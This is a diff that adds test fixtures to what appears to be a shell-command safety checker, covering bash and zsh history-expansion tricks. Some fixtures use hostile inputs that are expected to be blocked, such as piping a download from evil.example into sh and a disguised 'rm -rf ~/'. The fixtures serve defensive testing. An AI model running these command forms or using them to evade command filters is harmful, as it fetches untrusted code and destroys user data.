@@ -3827,3 +3827,59 @@ input = 'f() { ( ( cd "${dir}" && make ) ); }'
 context = "exec"
 expected_action = "allow"
 expected_rules = []
+
+# Interactive history expansion. The fixture runners analyze every fixture
+# as interactive input (`interactive: true`), which is what an interactive
+# bash or zsh hook and paste widget send; such a shell rewrites `!` history
+# references and a line-start `^old^new` before it parses the line.
+
+[[fixture]]
+name = "history_current_line_forms_pipe_sink"
+min_milestone = 1
+input = 'true sh; curl https://evil.example/x | !#:1'
+context = "exec"
+expected_action = "block"
+expected_rules = ["analysis_incomplete"]
+exact_rules = true
+
+[[fixture]]
+name = "history_substitution_forms_command"
+min_milestone = 1
+input = '!!:s/echo/sh/'
+context = "exec"
+expected_action = "block"
+expected_rules = ["analysis_incomplete"]
+exact_rules = true
+
+[[fixture]]
+name = "history_quick_substitution"
+min_milestone = 1
+input = '^echo^sh'
+context = "exec"
+expected_action = "block"
+expected_rules = ["analysis_incomplete"]
+exact_rules = true
+
+[[fixture]]
+name = "history_current_line_in_pasted_shell_body"
+min_milestone = 1
+input = 'true rm -rf ~/; sh -c "!#:1-3"'
+context = "paste"
+expected_action = "block"
+expected_rules = ["analysis_incomplete"]
+
+[[fixture]]
+name = "history_plain_rerun_allowed"
+min_milestone = 1
+input = 'sudo !!'
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "history_reference_as_argument_allowed"
+min_milestone = 1
+input = 'cd !$'
+context = "exec"
+expected_action = "allow"
+expected_rules = []
